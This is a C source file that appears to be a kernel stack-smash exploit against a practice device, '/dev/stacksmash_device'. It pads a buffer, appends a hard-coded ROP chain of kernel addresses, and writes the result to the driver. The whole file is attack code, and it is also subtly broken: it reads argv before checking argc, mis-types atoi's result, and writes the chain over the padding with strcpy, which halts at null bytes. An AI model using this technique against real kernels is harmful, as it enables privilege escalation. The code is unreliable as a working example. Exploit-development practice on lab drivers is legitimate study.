#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>

#define DEVICE_NAME "/dev/stacksmash_device"
const char * ROP_CHAIN[] = {
"\x9d\x52\x24\x81\xff\xff\xff\xff",
"\xe0\x8b\x08\x81\xff\xff\xff\xff",
"\x2b\xac\x30\x82\xff\xff\xff\xff",
"\xa0\x87\x08\x81\xff\xff\xff\xff" 
};
/*
- 0xffffffff8216da13 pop rdi ; retf
- 0x0000000000000000
- 0xffffffff81088be0
- 
*/
char *_setup_payload(size_t prefix_length, char** rop_chain,size_t rop_chain_length){

	printf("setting up payload...\n%d addresses in chain...\n", rop_chain_length);
        size_t total_length = rop_chain_length*8 + prefix_length;
	char * payload = (char *) malloc(sizeof(char)*total_length);
	memset(payload, 0x0, total_length);
	memset(payload, 0x41, prefix_length);

	size_t payload_index = 0;
	for (;payload_index < rop_chain_length;payload_index++){
		strcpy(payload+payload_index*8,rop_chain[payload_index]);	
	} 
        return payload;
}

int main(int argc, char **argv){
	int ret, fd;
	int *prefix_length = atoi(argv[1]);
	char *payload;

	if (argc < 2){
		printf("Usage: %s [prefix length]\n",argv[0]);
		return -1;
	}

	fd = open(DEVICE_NAME,O_RDWR);	
	if (fd < 0){
		printf("[stacksmash_driver main] Failed to open device [%s]\n",DEVICE_NAME);
		return -1;
	}
	
	payload = _setup_payload(prefix_length,ROP_CHAIN,4);
	printf("payload :=> [%s]\n",payload);
	
	ret = write(fd,payload,strlen(payload));
	if (ret < 0){
		printf("[stacksmash_driver main] Failed to write to device [%s]\n",DEVICE_NAME);
		return -1;
	}
	
	return 0;
}

